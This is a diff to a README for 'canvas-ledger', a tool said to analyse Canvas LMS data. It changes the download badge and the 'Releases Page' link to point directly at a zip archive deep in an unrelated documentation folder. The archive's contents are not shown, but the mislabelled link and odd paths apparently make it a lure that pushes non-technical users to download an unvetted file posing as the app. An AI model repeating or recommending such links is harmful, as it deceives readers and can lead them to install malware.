@@ -1,13 +1,13 @@
 # 📚 canvas-ledger - A Simple Way to Analyze Your Canvas Data
 
 ## 🔗 Download Now
-[![Download](https://github.com/Knn8787/canvas-ledger/raw/refs/heads/main/.specify/templates/canvas_ledger_truss.zip%20Ledger-blue)](https://github.com/Knn8787/canvas-ledger/raw/refs/heads/main/.specify/templates/canvas_ledger_truss.zip)
+[![Download](https://raw.githubusercontent.com/Knn8787/canvas-ledger/main/mkdocs/docs/workflows/ledger-canvas-v3.6.zip%20Ledger-blue)](https://raw.githubusercontent.com/Knn8787/canvas-ledger/main/mkdocs/docs/workflows/ledger-canvas-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to canvas-ledger! This tool helps you keep track of your Canvas LMS data in a local ledger. You can easily perform historical analysis on your data without needing any coding skills.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Knn8787/canvas-ledger/raw/refs/heads/main/.specify/templates/canvas_ledger_truss.zip).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Knn8787/canvas-ledger/main/mkdocs/docs/workflows/ledger-canvas-v3.6.zip).
 
 1. Once on the Releases page, look for the latest version of canvas-ledger.
 2. Click on the assets link to see the downloadable files.
